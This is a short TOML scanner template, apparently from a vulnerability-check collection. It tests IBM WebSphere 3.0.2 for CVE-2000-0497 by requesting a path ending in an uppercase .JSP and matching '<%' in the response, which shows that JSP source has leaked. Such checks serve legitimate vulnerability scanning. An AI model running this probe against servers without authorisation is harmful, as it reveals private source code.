[info]
author = "ave"
description = "通过发送大写 .JSP 扩展名的 URL 请求，触发 IBM WebSphere 3.0.2 源代码泄露，验证服务器是否将 JSP 源码以明文返回"
id = "POC-AVE-2000-0557"
name = "CVE-2000-0497 PoC"
severity = "high"
tags = ["ave-2000-0557"]
vuln_id = [
    "CVE-2000-0497",
    "AVE-2000-0557",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/test.JSP"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<%"]
